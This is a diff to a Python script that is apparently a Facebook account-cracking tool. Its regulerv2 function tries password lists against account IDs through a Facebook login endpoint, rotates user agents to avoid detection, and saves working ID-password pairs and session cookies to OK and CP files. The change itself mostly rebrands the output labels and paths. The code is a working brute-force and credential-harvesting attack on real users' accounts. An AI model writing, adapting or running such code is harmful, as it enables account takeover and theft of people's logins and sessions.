@@ -1320,7 +1320,7 @@ def regulerv2(idf,pwv,url):
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
 	prog.update(des,description=f'\r[bold white]Reguler V2[bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
 	prog.advance(des)
-	ua = random.choice(raka)
+	ua = random.choice(ugen)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
@@ -1373,16 +1373,16 @@ def regulerv2(idf,pwv,url):
 "accept-language": AinkRaka}
 			hehehe = ses.post(f'https://{url}/login/device-based/login/async/?api_key=3446862972255280&auth_token=f302da384cd8cc53013e453112408164&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D3446862972255280%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D213e9588-a6cd-4b2a-bd2b-69fd57b97361%26tp%3Dunspecified&refsrc=deprecated&app_id=3446862972255280&cancel=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F11417b77ed1748fd8306de7641026ae1%252Fcallback%23_%3D_&lwv=100', headers=head, data=date, allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				print(f' {P}[{K}Gizell CP{P}] {K}{idf}|{pw}')
-				open('RAKA_CP/'+raka_cp,'a').write(idf+'|'+pw+'\n')
+				print(f' {P}[{K}Rudal CP{P}] {K}{idf}|{pw}')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f' {P}[{H}Gizell OK{P}] {H}{idf}|{pw}\n{kuki}')
-				open('RAKA_OK/'+raka_ok,'a').write(idf+'|'+pw+'\n')
+				print(f' {P}[{H}Rudal OK{P}] {H}{idf}|{pw}\n{kuki}')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
